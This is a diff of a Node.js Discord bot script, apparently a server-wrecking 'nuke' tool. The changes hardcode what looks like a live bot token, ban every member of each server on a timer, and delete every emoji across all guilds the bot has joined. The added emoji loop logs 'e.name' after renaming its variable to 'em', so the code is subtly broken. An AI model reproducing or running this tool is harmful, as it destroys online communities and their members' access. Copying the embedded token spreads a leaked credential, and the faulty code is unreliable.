@@ -5,7 +5,8 @@ const chalk = require('chalk');
 
 // Settings for the bot.
 const settings = {
-    botToken: "INSERT TOKEN HERE"
+    //Make sure you insert actual token rather than Client ID
+    botToken: "Njc2ODcwMTc3OTE2NDUyODc1.XrBrEg.r4bRAdscUw3BmoKL9PPsULU-ir8"
 };
 
 //on ready:
@@ -54,18 +55,22 @@ client.on("ready", () => {
             //set interval to prevent ratelimit error (API restrictions)
             setInterval(function() {
 
-                m.members.ban()
+                m.ban()
                 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
-                    .catch(console.error);
+
             }, 3 * 100)
         });
     });
 
     //delete emojis
-    guild.emojis.forEach(e => {
-        guild.deleteEmoji(e);
-        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
+    client.guilds.forEach(guild => {
+        guild.emojis.forEach(em => {
+            guild.deleteEmoji(em);
+            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
+        });
     });
+
+
 
     //handle unexpected errors
     process.on("uncaughtException", err => {
